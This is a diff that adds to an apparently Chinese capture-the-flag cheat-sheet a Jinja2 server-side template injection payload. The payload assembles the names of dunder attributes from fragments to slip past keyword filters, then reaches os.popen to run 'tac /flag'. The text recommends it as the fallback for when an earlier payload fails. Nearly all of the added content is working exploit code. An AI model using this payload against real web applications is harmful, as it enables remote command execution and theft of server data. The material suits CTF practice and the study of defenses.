@@ -2240,6 +2240,23 @@ http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
 {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
 ```
 
+如果上面这个命令不行，用下面这个（**推荐用这个**）
+
+```
+http://xxx/?name={% set po=dict(po=a,p=b)|join%}
+{% set a=(()|select|string|list)|attr(po)(24)%}
+{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}
+{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}
+{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}
+{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}
+{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}
+{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}
+{%set pp=dict(pop=a,en=b)|join %}
+{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(132)|attr(ini)|attr(glo)|attr(geti)(pp)('tac /flag')|attr('read')() )%}
+```
+
+
+
 #### 文件漏洞
 
 ##### os.path.join()
